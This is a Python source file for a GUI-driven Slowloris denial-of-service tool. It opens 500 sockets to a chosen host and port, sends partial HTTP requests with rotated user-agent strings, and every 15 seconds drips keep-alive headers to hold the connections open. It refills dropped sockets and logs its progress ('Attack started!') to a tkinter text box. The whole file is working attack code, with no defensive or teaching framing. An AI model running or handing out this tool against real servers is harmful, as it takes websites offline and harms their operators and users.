# slowloris.py
import tkinter as tk
import threading
import socket
import random
import time

class SlowlorisAttack:
    def __init__(self, text_box, stop_event, attack_threads):
        self.text_box = text_box
        self.stop_attack_event = stop_event
        self.attack_threads = attack_threads

    def slowloris_attack(self, target_host, target_port):
        num_sockets = 500
        socket_list = []
        user_agents = [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
        ]

        def init_socket(ip):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)

            try:
                s.connect((ip, target_port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                ua = random.choice(user_agents)
                s.send(f"User-Agent: {ua}\r\n".encode("utf-8"))
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            except socket.error as e:
                self.text_box.insert(tk.END, f"Socket error: {e}\n")
                s.close()
                return None
            return s

        def slowloris_iteration():
            try:
                self.text_box.insert(tk.END, "Sending keep-alive headers...\n")
                self.text_box.insert(tk.END, f"Socket count: {len(socket_list)}\n")

                for s in list(socket_list):
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    except socket.error:
                        socket_list.remove(s)

                diff = num_sockets - len(socket_list)
                if diff > 0:
                    self.text_box.insert(tk.END, f"Creating {diff} new sockets...\n")
                    for _ in range(diff):
                        s = init_socket(target_host)
                        if s:
                            socket_list.append(s)
            except Exception as e:
                self.text_box.insert(tk.END, f"Error: {e}\n")
                self.stop_attack_event.set()

        def attack():
            while not self.stop_attack_event.is_set():
                slowloris_iteration()
                time.sleep(15)

        def start_attack():
            self.text_box.delete("1.0", tk.END)  # Clear the initial instructions
            self.text_box.insert(tk.END, "Please wait while starting the attack...\n")
            self.text_box.insert(tk.END, "Initializing sockets...\n")
            self.text_box.insert(tk.END, "Attack started!\n")
            for _ in range(num_sockets):
                if self.stop_attack_event.is_set():
                    self.text_box.insert(tk.END, "Attack stopped!\n")
                    return
                s = init_socket(target_host)
                if s:
                    socket_list.append(s)

            if self.stop_attack_event.is_set():
                self.text_box.insert(tk.END, "Attack stopped!\n")
                return

            attack_thread = threading.Thread(target=attack)
            attack_thread.start()
            self.attack_threads.append(attack_thread)

        threading.Thread(target=start_attack).start()

    def stop_attack(self):
        self.stop_attack_event.set()
        self.text_box.insert(tk.END, "Stopping Slowloris attack...\n")
        for thread in self.attack_threads:
            thread.join()
        self.text_box.insert(tk.END, "Attack stopped!\n")
